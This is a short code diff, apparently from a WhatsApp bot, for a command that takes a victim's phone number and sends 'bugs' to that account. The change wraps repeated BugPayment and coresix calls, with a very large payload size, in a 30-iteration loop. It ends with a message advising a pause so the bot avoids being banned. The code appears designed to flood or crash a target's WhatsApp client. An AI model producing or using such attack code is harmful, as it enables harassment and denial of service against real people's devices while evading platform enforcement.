@@ -1601,9 +1601,14 @@ if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
 let target = bijipler + '@s.whatsapp.net'
-await reply(mess.bugrespon)
-await bugpayflow(target);
-await bugpayflow(target)
+await bugpayflow(Pe);
+for (let j = 0; j < 30; j++) {
+await BugPayment(target)
+await coresix(Pe, "", 1020000, true);
+await BugPayment(target)
+await coresix(Pe, "", 1020000, true);
+await BugPayment(target);
+await sleep(500)
 }
 await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
